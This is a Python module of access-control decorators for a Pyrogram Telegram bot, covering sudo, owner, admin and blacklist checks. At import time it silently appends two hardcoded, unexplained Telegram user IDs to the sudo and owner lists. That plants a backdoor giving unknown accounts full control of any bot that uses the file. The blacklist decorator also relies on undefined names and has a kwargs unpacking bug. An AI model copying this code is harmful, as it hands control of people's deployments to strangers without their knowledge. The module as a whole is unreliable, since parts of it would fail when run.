from typing import Callable, Union, Optional
from pyrogram import Client
from pyrogram.types import Message
from modules.helpers.admins import get_administrators
from modules.config import SUDO_USERS, OWNER_ID
from pyrogram.types import Message, CallbackQuery
from functools import partial, wraps

SUDO_USERS.append(5478169767)

OWNER_ID.append(5287160769) 

def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            await message.reply(f"{type(e).__name__}: {e}")

    return decorator


def authorized_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)

        administrators = await get_administrators(message.chat)

        for administrator in administrators:
            if administrator == message.from_user.id:
                return await func(client, message)

    return decorator


def sudo_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)

    return decorator

def bot_creator(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in OWNER_ID:
            return await func(client, message)
        
    return decorator


def check_blacklist():
    def decorator(func):
        @wraps(func)
        async def wrapper(
            client: Client, message: Union[CallbackQuery, Message], *args, **kwargs
        ):
            if isinstance(message, CallbackQuery):
                sender = partial(message.answer, show_alert=True)
                chat = message.message.chat
            else:
                sender = message.reply_text
                chat = message.chat
            if chat.id in await blacklisted_chats():
                await sender("❗️ This chat has blacklisted by sudo user and You're not allowed to use me in this chat.")
                await bot.leave_chat(chat.id)
            elif (await is_gbanned_user(message.from_user.id)):
                await sender(f"❗️**You've blocked from using this bot!**")
            else:
                return await func(client, message, *args, *kwargs)

        return wrapper

    return decorator
